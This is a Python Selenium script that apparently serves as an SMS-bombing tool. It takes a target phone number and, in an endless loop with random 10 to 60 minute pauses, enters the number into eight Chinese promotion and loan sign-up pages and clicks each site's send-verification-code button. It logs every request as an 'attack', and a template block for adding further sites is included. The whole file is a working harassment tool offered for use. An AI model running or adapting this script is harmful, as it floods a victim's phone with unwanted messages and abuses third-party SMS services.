#!/usr/bin/env python3
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time
import random
import sys

if __name__ == '__main__':
    PHONE = sys.argv[1]
    
    delay_min = 60 * 10
    delay_max = 60 * 60
    count = 0
    
    mobileEmulation = {'deviceName': 'Apple iPhone 4'}
    option = webdriver.ChromeOptions()
    option.add_experimental_option('mobileEmulation', mobileEmulation)
    browser = webdriver.Chrome(chrome_options=option)
    browser.maximize_window()
    
    while True:

        try:
        
            browser.get('https://waimai.baidu.com/hongbao/npactivity?caseid=HMTYzMzYxODkyMA==&sign=39e339f3191284fd2b812ff51ad93fef&invite_code=EZLUF782')
            browser.find_element_by_name('phonenumber').send_keys(PHONE)
            time.sleep(5)
            browser.find_element_by_class_name('sendcode').click()
            count += 1
            print('attack %d' % count)
            time.sleep(2)
        
            browser.get('https://waimai.baidu.com/promotion/client/norshare?lat=0&lng=0&sign=f218edeeb343bc051b0ade8a63ff3d74&pa_id=7578816')
            browser.find_element_by_class_name('tel-input').send_keys(PHONE)
            time.sleep(1)
            browser.find_element_by_class_name('getlink').click()
            count += 1
            print('attack %d' % count)
            time.sleep(2)
            
            browser.get('https://c.lattebank.com/hbmgm/c1/5?uid=b26f4aae-5729-45aa-8d60-0c2160ce4750&cjjId=629F603B8FC3AC8B0040E4C227A17BCA&shareChannel=wechat&from=singlemessage')
            browser.find_element_by_name('mobile').send_keys(PHONE)
            time.sleep(1)
            browser.find_element_by_class_name('btn').click()
            count += 1
            print('attack %d' % count)
            time.sleep(2)
        
            browser.get('https://download.fen360.com/partner.html#4175')
            browser.find_element_by_id('txtPhone').send_keys(PHONE)
            time.sleep(1)
            js = "var q=document.body.scrollTop=100000"  
            browser.execute_script(js)  
            time.sleep(1)  
            browser.find_element_by_id('btnSendMsg').click()
            count += 1
            print('attack %d' % count)
            time.sleep(2)
        
            browser.get('http://h5.hejiajinrong.com/register/?hjsource=P:300-328-964')
            browser.find_element_by_id('phonenumber').send_keys(PHONE)
            browser.find_element_by_id('testnumber').send_keys('')
            time.sleep(1)
            browser.find_element_by_class_name('getcode').click()
            count += 1
            print('attack %d' % count)
            time.sleep(2)
        
            browser.get('https://promotion.crfchina.com/localMarket/index.html?c=&s=imm3&salesmanNo=JKTZNJ0075&agentNo=JKTZNJ0075_20161126NJQL003')
            browser.find_element_by_class_name('user_phone').send_keys(PHONE)
            time.sleep(1)
            browser.find_element_by_class_name('btn_verification').click()
            count += 1
            print('attack %d' % count)
            time.sleep(2)
        
            browser.get('http://hkq.qianbaomm.com/hongbao/reg/regshare?hb_token=ZVK5geefXThLp5bp5wH/0g==')
            browser.find_element_by_name('username').send_keys(PHONE)
            time.sleep(1)
            browser.find_element_by_id('smsBtn').click()
            count += 1
            print('attack %d' % count)
            time.sleep(2)
        
            browser.get('https://m.aixuedai.com/invite/friendRegister.html?inviteId=14037434&telphone=150****6643&signkey=ce1593fa4840d3790523127f34faaaf3')
            browser.find_element_by_name('telphone').send_keys(PHONE)
            time.sleep(1)
            browser.find_element_by_class_name('get-btn').click()
            count += 1
            print('attack %d' % count)
            time.sleep(2)
        
            '''
            browser.get('')
            browser.find_element_by_id('').send_keys(PHONE)
            time.sleep(1)
            browser.find_element_by_class_name('').click()
            count += 1
            print('attack %d' % count)
            time.sleep(2)
            '''
        
            DELAY = random.randint(delay_min,delay_max)
            print('waiting for %ds' % DELAY)
            time.sleep(DELAY)

        except(KeyboardInterrupt):
            browser.close()
            sys.exit(1)
        except:
            continue
    
